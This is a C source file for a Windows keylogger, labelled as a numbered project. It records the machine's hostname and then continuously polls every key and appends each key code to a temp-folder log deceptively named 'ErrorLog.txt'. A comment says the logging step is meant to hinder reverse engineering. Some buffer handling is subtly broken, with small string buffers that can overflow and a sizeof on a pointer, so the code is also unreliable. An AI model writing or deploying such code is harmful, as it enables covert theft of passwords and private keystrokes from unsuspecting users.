// 315 Keylogger Project
#include <stdio.h>
#include <stdlib.h>

#if defined (_WIN32)
  #define LOGFILE "%temp%\\ErrorLog.txt"
  #include <Windows.h>
  #include <winsock.h>
  #pragma comment(lib, "User32.lib")

  // Main windows function
  int main(){
    TCHAR logFile[MAX_PATH] = { 0 };
  	ExpandEnvironmentStrings(LOGFILE, logFile, _countof(logFile));

    char cName[MAX_COMPUTERNAME_LENGTH + 1]; //need to allocate space
    DWORD len = 55;//needs DWORD
    if(GetComputerName(cName, &len) != 0) {
      char host[sizeof(cName)+10];
      strcpy(host, "Hostname: ");
      strcat(cName, "\n");
      strcat(host, cName);
      printf("[*] %s",host);

      FILE *file = NULL;
      fopen_s(&file, logFile, "a+");
      fwrite(host, sizeof(host), 1, file);
      fclose(file);
    }
    else {
      printf("[-] Error: could not get hostname");
    }

    int last_vKey = 0;
  	while (1){
  		for (int vKey = 1; vKey < 200; vKey++)
  		{
  			if (GetAsyncKeyState(last_vKey) != 0)
  				continue;

  			last_vKey = vKey;

  			if (GetAsyncKeyState(vKey) != 0)
  			{
  				last_vKey = vKey;

          // Open text file with create or append
          FILE *file = NULL;
          fopen_s(&file, logFile, "a+");

          // Process vkey
          printf("[*] Pressed key with keycode %d\n", vKey);

          char v_string[8];
          sprintf(v_string, "%d", vKey);
          // Append newline to keycode and makes it harder to RE
          char src[4];
          char dest[4];
          strcpy(src, v_string);
          strcpy(dest, "\n");
          strcat(src, dest);

          fwrite(src, sizeof(src+1), 1, file);
          fclose(file);
  			}
  		}
  	}
  }
#else
    // If windows or linux is not defined
    int main(){
      printf("[-] Error while compiling... incompatable os\n");
      exit(0);
    }
#endif
